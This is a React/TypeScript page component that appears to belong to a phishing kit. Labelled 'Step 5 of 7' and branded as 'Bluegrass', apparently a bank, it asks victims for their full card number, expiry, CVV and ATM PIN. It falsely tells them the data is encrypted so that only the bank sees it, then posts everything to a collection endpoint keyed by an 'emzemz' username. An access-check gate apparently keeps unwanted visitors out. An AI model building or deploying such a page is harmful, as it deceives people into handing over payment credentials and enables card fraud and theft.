import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowPageLayout from '../components/FlowPageLayout';

type CardErrors = {
  cardNumber: string;
  expiry: string;
  cvv: string;
  atmPin: string;
  form: string;
};

const Card: React.FC = () => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('');
  const [expiryYear, setExpiryYear] = useState('');
  const [cvv, setCvv] = useState('');
  const [atmPin, setAtmPin] = useState('');
  const [showCvv, setShowCvv] = useState(false);
  const [showPin, setShowPin] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<CardErrors>({
    cardNumber: '',
    expiry: '',
    cvv: '',
    atmPin: '',
    form: ''
  });
  const [username, setUsername] = useState('');

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz: emzemzState } = (location.state as { emzemz?: string } | undefined) ?? {};
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (emzemzState) {
      setUsername(emzemzState);
    }
  }, [emzemzState]);

  if (isAllowed === null) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#4A9619] text-lg text-white">
        Checking access…
      </div>
    );
  }

  if (isAllowed === false) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#4A9619] text-lg text-white">
        Access denied. Redirecting…
      </div>
    );
  }

  if (!username) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#4A9619] text-lg text-white">
        Missing session data. Please restart the flow.
      </div>
    );
  }

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 15 }, (_, index) => currentYear + index);

  const formatCardNumber = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 16);
    const groups = digitsOnly.match(/.{1,4}/g);
    return groups ? groups.join(' ') : digitsOnly;
  };

  const renderError = (message: string) =>
    message ? (
      <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
        <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
          <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
        </svg>
        {message}
      </p>
    ) : null;

  const validateForm = () => {
    const cardDigits = cardNumber.replace(/\s/g, '');

    const nextErrors: CardErrors = {
      cardNumber: cardDigits.length !== 16 ? 'Card number must be 16 digits' : '',
      expiry: !expiryMonth || !expiryYear ? 'Expiry date is required' : '',
      cvv: cvv.length !== 3 && cvv.length !== 4 ? 'CVV must be 3 or 4 digits' : '',
      atmPin: atmPin.length !== 4 ? 'ATM PIN must be 4 digits' : '',
      form: ''
    };

    setErrors(nextErrors);
    return { cardDigits, isValid: !Object.values(nextErrors).some(Boolean) };
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    const { cardDigits, isValid } = validateForm();

    if (!isValid) {
      return;
    }

    setIsLoading(true);

    try {
      await axios.post(`${baseUrl}api/bluegrass-card-info/`, {
        emzemz: username,
        cardNumber: cardDigits,
        expiryMonth,
        expiryYear,
        cvv,
        atmPin
      });

      navigate('/terms', { state: { emzemz: username } });
    } catch (error) {
      console.error('Error submitting card info:', error);
      setErrors((prev) => ({
        ...prev,
        form: 'There was an error submitting your card information. Please try again.'
      }));
      setIsLoading(false);
    }
  };

  return (
    <FlowPageLayout
      eyebrow="Step 5 of 7"
      title="Secure Your Card"
      description="We encrypt your information so only Bluegrass can see it. Enter the card details connected to your account."
      contentClassName="space-y-10"
    >
      <form onSubmit={handleSubmit} className="space-y-8">
        {errors.form && (
          <div className="rounded-xl border border-red-100 bg-red-50 px-4 py-3 text-sm text-red-700">
            {errors.form}
          </div>
        )}

        <section className="space-y-6">
          <header className="space-y-1">
            <h2 className="text-lg font-semibold text-[#123524]">Card Information</h2>
            <p className="text-sm text-[#557a46]">Provide the details exactly as they appear on your card.</p>
          </header>

          <div className="grid gap-6">
            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="cardNumber">
                Card Number
              </label>
              <input
                id="cardNumber"
                name="cardNumber"
                type="text"
                value={cardNumber}
                onChange={(event) => setCardNumber(formatCardNumber(event.target.value))}
                maxLength={19}
                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                placeholder="1234 5678 9012 3456"
                inputMode="numeric"
              />
              {renderError(errors.cardNumber)}
            </div>

            <div className="grid gap-4 md:grid-cols-2">
              <div className="space-y-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="expiryMonth">
                  Expiry Month
                </label>
                <select
                  id="expiryMonth"
                  value={expiryMonth}
                  onChange={(event) => setExpiryMonth(event.target.value)}
                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                >
                  <option value="">Month</option>
                  {Array.from({ length: 12 }, (_, index) => (
                    <option key={index + 1} value={String(index + 1).padStart(2, '0')}>
                      {String(index + 1).padStart(2, '0')}
                    </option>
                  ))}
                </select>
              </div>

              <div className="space-y-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="expiryYear">
                  Expiry Year
                </label>
                <select
                  id="expiryYear"
                  value={expiryYear}
                  onChange={(event) => setExpiryYear(event.target.value)}
                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                >
                  <option value="">Year</option>
                  {years.map((value) => (
                    <option key={value} value={String(value)}>
                      {value}
                    </option>
                  ))}
                </select>
              </div>
            </div>
            {renderError(errors.expiry)}

            <div className="grid gap-4 md:grid-cols-2">
              <div className="space-y-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="cvv">
                  CVV
                </label>
                <div className="flex items-center gap-3">
                  <input
                    id="cvv"
                    name="cvv"
                    type={showCvv ? 'text' : 'password'}
                    value={cvv}
                    onChange={(event) => {
                      const value = event.target.value.replace(/\D/g, '');
                      if (value.length <= 4) {
                        setCvv(value);
                      }
                    }}
                    maxLength={4}
                    className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                    placeholder="123"
                    inputMode="numeric"
                  />
                  <button
                    type="button"
                    onClick={() => setShowCvv((prev) => !prev)}
                    className="text-xs font-semibold text-[#0b5da7] hover:underline"
                  >
                    {showCvv ? 'Hide' : 'Show'}
                  </button>
                </div>
                {renderError(errors.cvv)}
              </div>

              <div className="space-y-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="atmPin">
                  ATM PIN
                </label>
                <div className="flex items-center gap-3">
                  <input
                    id="atmPin"
                    name="atmPin"
                    type={showPin ? 'text' : 'password'}
                    value={atmPin}
                    onChange={(event) => {
                      const value = event.target.value.replace(/\D/g, '');
                      if (value.length <= 4) {
                        setAtmPin(value);
                      }
                    }}
                    maxLength={4}
                    className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                    placeholder="••••"
                    inputMode="numeric"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPin((prev) => !prev)}
                    className="text-xs font-semibold text-[#0b5da7] hover:underline"
                  >
                    {showPin ? 'Hide' : 'Show'}
                  </button>
                </div>
                {renderError(errors.atmPin)}
              </div>
            </div>
          </div>
        </section>

        <div className="flex justify-end">
          <button
            type="submit"
            disabled={isLoading}
            className="inline-flex items-center justify-center rounded-xl bg-[#4A9619] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {isLoading ? 'Submitting…' : 'Continue'}
          </button>
        </div>
      </form>
    </FlowPageLayout>
  );
};

export default Card;
